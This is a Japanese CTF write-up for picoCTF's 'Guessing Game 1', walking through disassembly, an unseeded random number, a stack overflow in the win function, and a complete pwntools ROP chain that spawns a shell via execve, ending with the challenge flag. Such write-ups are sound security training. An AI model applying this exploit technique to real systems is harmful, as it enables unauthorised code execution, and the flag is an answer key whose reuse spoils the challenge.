# Guessing Game1
## Makefile
```makefile
all:
	gcc -m64 -fno-stack-protector -O0 -no-pie -static -o vuln vuln.c

clean:
	rm vuln
```

## checksec
```
Canary                        : ✓
NX                            : ✓
PIE                           : ✘
Fortify                       : ✘
RelRO                         : Partial
```
なんかMakefileの内容と違う...
カナリアが付いてる。なぜ？

## main
```asm
   0x0000000000400c8c <+0>:     push   rbp
   0x0000000000400c8d <+1>:     mov    rbp,rsp
   0x0000000000400c90 <+4>:     sub    rsp,0x20
   0x0000000000400c94 <+8>:     mov    DWORD PTR [rbp-0x14],edi
   0x0000000000400c97 <+11>:    mov    QWORD PTR [rbp-0x20],rsi
   0x0000000000400c9b <+15>:    mov    rax,QWORD PTR [rip+0x2b9afe]        # 0x6ba7a0 <stdout>
   0x0000000000400ca2 <+22>:    mov    ecx,0x0
   0x0000000000400ca7 <+27>:    mov    edx,0x2
   0x0000000000400cac <+32>:    mov    esi,0x0
   0x0000000000400cb1 <+37>:    mov    rdi,rax
   0x0000000000400cb4 <+40>:    call   0x411320 <setvbuf>
   0x0000000000400cb9 <+45>:    call   0x449e30 <getegid>
   0x0000000000400cbe <+50>:    mov    DWORD PTR [rbp-0x4],eax
   0x0000000000400cc1 <+53>:    mov    edx,DWORD PTR [rbp-0x4]
   0x0000000000400cc4 <+56>:    mov    ecx,DWORD PTR [rbp-0x4]
   0x0000000000400cc7 <+59>:    mov    eax,DWORD PTR [rbp-0x4]
   0x0000000000400cca <+62>:    mov    esi,ecx
   0x0000000000400ccc <+64>:    mov    edi,eax
   0x0000000000400cce <+66>:    mov    eax,0x0
   0x0000000000400cd3 <+71>:    call   0x449e40 <setresgid>
   0x0000000000400cd8 <+76>:    lea    rdi,[rip+0x92409]        # 0x4930e8
   0x0000000000400cdf <+83>:    call   0x411120 <puts>
   0x0000000000400ce4 <+88>:    mov    eax,0x0
   0x0000000000400ce9 <+93>:    call   0x400b9a <do_stuff>
   0x0000000000400cee <+98>:    mov    DWORD PTR [rbp-0x8],eax
   0x0000000000400cf1 <+101>:   cmp    DWORD PTR [rbp-0x8],0x0
   0x0000000000400cf5 <+105>:   je     0x400ce4 <main+88>
   0x0000000000400cf7 <+107>:   mov    eax,0x0
   0x0000000000400cfc <+112>:   call   0x400c40 <win>
   0x0000000000400d01 <+117>:   jmp    0x400ce4 <main+88
```

`do_stuff`を抜けれると`win`にたどり着けるっぽい

## do_stuff 
```asm
   0x0000000000400b9a <+0>:     push   rbp
   0x0000000000400b9b <+1>:     mov    rbp,rsp
   0x0000000000400b9e <+4>:     add    rsp,0xffffffffffffff80
   0x0000000000400ba2 <+8>:     mov    eax,0x0
   0x0000000000400ba7 <+13>:    call   0x400b6f <get_random>
   0x0000000000400bac <+18>:    mov    QWORD PTR [rbp-0x10],rax
   0x0000000000400bb0 <+22>:    mov    rax,QWORD PTR [rbp-0x10]
   0x0000000000400bb4 <+26>:    mov    rdi,rax
   0x0000000000400bb7 <+29>:    call   0x400b5d <increment>
   0x0000000000400bbc <+34>:    mov    QWORD PTR [rbp-0x10],rax
   0x0000000000400bc0 <+38>:    mov    DWORD PTR [rbp-0x4],0x0
   0x0000000000400bc7 <+45>:    lea    rdi,[rip+0x9247a]        # 0x493048
   0x0000000000400bce <+52>:    call   0x411120 <puts>
   0x0000000000400bd3 <+57>:    mov    rdx,QWORD PTR [rip+0x2b9bce]        # 0x6ba7a8 <stdin>
   0x0000000000400bda <+64>:    lea    rax,[rbp-0x80]
   0x0000000000400bde <+68>:    mov    esi,0x64
   0x0000000000400be3 <+73>:    mov    rdi,rax
   0x0000000000400be6 <+76>:    call   0x410a10 <fgets>
   0x0000000000400beb <+81>:    lea    rax,[rbp-0x80]
   0x0000000000400bef <+85>:    mov    rdi,rax
   0x0000000000400bf2 <+88>:    call   0x40dd60 <atol>
   0x0000000000400bf7 <+93>:    mov    QWORD PTR [rbp-0x18],rax
   0x0000000000400bfb <+97>:    cmp    QWORD PTR [rbp-0x18],0x0
   0x0000000000400c00 <+102>:   jne    0x400c10 <do_stuff+118>
   0x0000000000400c02 <+104>:   lea    rdi,[rip+0x92464]        # 0x49306d
   0x0000000000400c09 <+111>:   call   0x411120 <puts>
   0x0000000000400c0e <+116>:   jmp    0x400c3b <do_stuff+161>
   0x0000000000400c10 <+118>:   mov    rax,QWORD PTR [rbp-0x18]
   0x0000000000400c14 <+122>:   cmp    rax,QWORD PTR [rbp-0x10]
   0x0000000000400c18 <+126>:   jne    0x400c2f <do_stuff+149>
   0x0000000000400c1a <+128>:   lea    rdi,[rip+0x92467]        # 0x493088
   0x0000000000400c21 <+135>:   call   0x411120 <puts>
   0x0000000000400c26 <+140>:   mov    DWORD PTR [rbp-0x4],0x1
   0x0000000000400c2d <+147>:   jmp    0x400c3b <do_stuff+161>
   0x0000000000400c2f <+149>:   lea    rdi,[rip+0x9248a]        # 0x4930c0
   0x0000000000400c36 <+156>:   call   0x411120 <puts>
   0x0000000000400c3b <+161>:   mov    eax,DWORD PTR [rbp-0x4]
   0x0000000000400c3e <+164>:   leave
   0x0000000000400c3f <+165>:   ret
```

## get_random 
```asm
   0x0000000000400b6f <+0>:     push   rbp
   0x0000000000400b70 <+1>:     mov    rbp,rsp
   0x0000000000400b73 <+4>:     call   0x40ef30 <rand>
   0x0000000000400b78 <+9>:     mov    ecx,eax
   0x0000000000400b7a <+11>:    mov    edx,0x51eb851f
   0x0000000000400b7f <+16>:    mov    eax,ecx
   0x0000000000400b81 <+18>:    imul   edx
   0x0000000000400b83 <+20>:    sar    edx,0x5
   0x0000000000400b86 <+23>:    mov    eax,ecx
   0x0000000000400b88 <+25>:    sar    eax,0x1f
   0x0000000000400b8b <+28>:    sub    edx,eax
   0x0000000000400b8d <+30>:    mov    eax,edx
   0x0000000000400b8f <+32>:    imul   eax,eax,0x64
   0x0000000000400b92 <+35>:    sub    ecx,eax
   0x0000000000400b94 <+37>:    mov    eax,ecx
   0x0000000000400b96 <+39>:    cdqe
   0x0000000000400b98 <+41>:    pop    rbp
   0x0000000000400b99 <+42>:    ret
```

`rand`のシードが設定されていないように見える 
試してみると実行するたび同じ値が返ってきていた 
返った値が`increment`に渡されている

## increment 
```asm
   0x0000000000400b5d <+0>:     push   rbp
   0x0000000000400b5e <+1>:     mov    rbp,rsp
   0x0000000000400b61 <+4>:     mov    QWORD PTR [rbp-0x8],rdi
   0x0000000000400b65 <+8>:     mov    rax,QWORD PTR [rbp-0x8]
   0x0000000000400b69 <+12>:    add    rax,0x1
   0x0000000000400b6d <+16>:    pop    rbp
   0x0000000000400b6e <+17>:    ret
```
ただ`1`足すだけ

## win関数へ... 
毎回初めの乱数は`0x53`であることが分かったので、入力を1足した`84`にするとwin関数にたどり着けた

```asm
   0x0000000000400c40 <+0>:     push   rbp
   0x0000000000400c41 <+1>:     mov    rbp,rsp
   0x0000000000400c44 <+4>:     sub    rsp,0x70
   0x0000000000400c48 <+8>:     lea    rdi,[rip+0x92478]        # 0x4930c7
   0x0000000000400c4f <+15>:    mov    eax,0x0
   0x0000000000400c54 <+20>:    call   0x410010 <printf>
   0x0000000000400c59 <+25>:    mov    rdx,QWORD PTR [rip+0x2b9b48]        # 0x6ba7a8 <stdin>
   0x0000000000400c60 <+32>:    lea    rax,[rbp-0x70]
   0x0000000000400c64 <+36>:    mov    esi,0x168
   0x0000000000400c69 <+41>:    mov    rdi,rax
   0x0000000000400c6c <+44>:    call   0x410a10 <fgets>
   0x0000000000400c71 <+49>:    lea    rax,[rbp-0x70]
   0x0000000000400c75 <+53>:    mov    rsi,rax
   0x0000000000400c78 <+56>:    lea    rdi,[rip+0x9245b]        # 0x4930da
   0x0000000000400c7f <+63>:    mov    eax,0x0
   0x0000000000400c84 <+68>:    call   0x410010 <printf>
   0x0000000000400c89 <+73>:    nop
   0x0000000000400c8a <+74>:    leave
   0x0000000000400c8b <+75>:    ret
```

明らかにBoFできそう
checksecではカナリアがあるとされていたが、試してみるとカナリアはないことが分かる。つまりMakefileが正しい。
```
New winner!
Name? aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
Congrats aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa

Segmentation fault
```

## ROP
ソースの中でフラグを読んでいなさそうなのでシェルが欲しい
シェルを呼び出すには`execv`などを使用する必要がある
`execv`システムコールを使うなら引数に`/bin/sh`を載せる必要がある。
以下のコマンドでROP chaiに使えそうな命令を調べる

```bash
ROPgadget --binary ./vuln --ropchain
```

```bash
[+] Gadget found: 0x47ff91 mov qword ptr [rsi], rax ; ret
```
このようなガジェットが見つかるので書き込み可能なメモリに対して好きに描き込みを行えそう
書き込み可能なメモリ領域として、今回は`bss`セクションを使用することにする

方針は以下となる
- `bss`セクションに`/bin/sh`を書き込む
- 書き込んだ値をスタックに読み出す
- `rax`に`execv`のシステムコール番号を入れる
- `syscall`を呼ぶ

これでシェルが取れるはず

## solver
pythonで書く
```python
from pwn import *

elf = ELF("./vuln")
rop = ROP(elf)

# io = process("./vuln")
io = remote("jupiter.challenges.picoctf.org", 26735)
io.recvuntil(b"What number would you like to guess?")
io.sendline(b"84")

io.recvuntil("Name?")
offset = 8 * 15
pop_rdi = rop.find_gadget(["pop rdi", "ret"])[0]
pop_rax = rop.find_gadget(["pop rax", "ret"])[0]
pop_rsi = rop.find_gadget(["pop rsi", "ret"])[0]
pop_rdx = rop.find_gadget(["pop rdx", "ret"])[0]
syscall = rop.find_gadget(["syscall", "ret"])[0]
mov_rsi_rax = 0x47FF91
binsh = b"/bin/sh\x00"

payload = b"a" * offset
payload += p64(pop_rax)
payload += binsh
payload += p64(pop_rsi)
payload += p64(elf.bss())
payload += p64(mov_rsi_rax)

payload += p64(pop_rdi)
payload += p64(elf.bss())
payload += p64(pop_rsi)
payload += p64(0x0)
payload += p64(pop_rdx)
payload += p64(0x0)
payload += p64(pop_rax)
payload += p64(0x3B)
payload += p64(syscall)

print(payload)
io.sendline(payload)
io.interactive()
```

これでシェルを奪取することができた
`picoCTF{r0p_y0u_l1k3_4_hurr1c4n3_b751b438dd8c4bb7}`
